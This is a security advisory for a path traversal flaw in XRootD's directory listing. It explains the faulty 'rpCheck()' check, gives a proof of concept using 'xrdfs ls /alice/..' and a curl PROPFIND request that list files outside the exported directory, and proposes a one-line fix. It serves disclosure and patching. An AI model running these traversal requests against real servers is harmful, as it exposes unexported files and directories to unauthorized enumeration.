# [M] xrootd has path traversal in directory listing that allows access to the parent directory via trailing ".." pattern

## Summary
Severity: Medium
Advisory: GHSA-vj8v-p5vw-m6v5
CWE: CWE-20, CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-vj8v-p5vw-m6v5
Type: github-advisory

## Affected
- PyPI: `xrootd` — affected >=0 <5.9.2

## Details
## Summary

A path traversal vulnerability in XRootD allows users to escape the exported directory scope and enumerate the contents of the parent directory by appending `/..` (specifically without trailing slash) to an exported path in `xrdfs ls` or `HTTP PROPFIND` requests.

This bypass ignores the `all.export` restriction.

## Affected component

`src/XrdXrootd/XrdXrootdXeq.cc`, and more precisely the functions `rpCheck()` and `Squash()` used in `do_Dirlist()` ([link](https://github.com/xrootd/xrootd/blob/19aa6dee76906fb4d56ded55e49bbe4171ade915/src/XrdXrootd/XrdXrootdXeq.cc#L696)), as they do not check if the path ends with ".." (without trailing slash).
Then the path is passed directly to the filesystem layer.

## PoC

### Configuration

- **Configuration file:** 
```conf
xrd.port 1094

# Exposing only /alice/
oss.localroot /srv/xrootd/data/
all.export /alice/

# HTTP
xrd.protocol http:1094 libXrdHttp.so

# Logs / monitoring
all.adminpath /var/spool/xrootd
all.pidpath /var/run/xrootd
```

- **Filesystem layout on the server:**
```
/srv/xrootd/data/
├── alice/       ← only exported directory
├── bob/         ← not exported
└── secret.txt   ← not exported
```

- **Starting the server:**  `xrootd -c /etc/xrootd/xrootd.cfg` 

### Steps to reproduce

**Normal behavior (access outside export is denied):**
```bash
$ xrdfs root://<xrootd-server> ls /
[ERROR] Server responded with an error: [3010] Stating path '/' is disallowed.
```

**Bypass via trailing `..`:**
```bash
$ xrdfs root://<xrootd-server>ls /alice/..
/alice/../alice
/alice/../bob
/alice/../secret.txt
```
 
**Also exploitable via HTTP PROPFIND:**

```bash
curl -X PROPFIND 'http://<xrootd-server>:1094/alice/..' \
  --path-as-is \
  -H "Depth: 1"
```
Returns HTTP 200 with full listing of the parent directory, including unexported entries (`bob/`, `secret.txt`).

**However, file download via this path traversal is blocked:**
```bash
$ xrdcp root://<xrootd-server>/alice/../secret.txt .
[0B/0B][100%][==================================================][0B/s]  
Run: [ERROR] Server responded with an error: [3010] Opening relative path 'alice/../secret.txt' is disallowed. (source)
```

## Impact
An attacker can enumerate directories and filenames outside the authorized export scope defined by `all.export`. In the example above, a server exporting only `/alice/` leaks the existence of `/bob/` and `secret.txt` located in the parent directory (`oss.localroot`).

File download is not possible through this vector, as `xrdcp` correctly rejects the path with error 3010. The impact seems therefore limited to **information disclosure** (directory and filename enumeration).

This vulnerability could affect all XRootD deployments regardless of authentication configuration, as it bypasses the export path restriction itself.

## Suggested fix

In `rpCheck()` (`src/XrdXrootd/XrdXrootdXeq.cc`), change:
```cpp
// Before
if (fn[0] == '.' && fn[1] == '.' && fn[2] == '/') return 1;

// After
if (fn[0] == '.' && fn[1] == '.' && (fn[2] == '/' || fn[2] == '\0')) return 1;
```

## References
- https://github.com/xrootd/xrootd/security/advisories/GHSA-vj8v-p5vw-m6v5
- https://github.com/xrootd/xrootd/commit/45efac7267a115ca4f2102214498e8cb011eb69b
- https://github.com/xrootd/xrootd
- http://github.com/xrootd/xrootd/releases/tag/v5.9.2
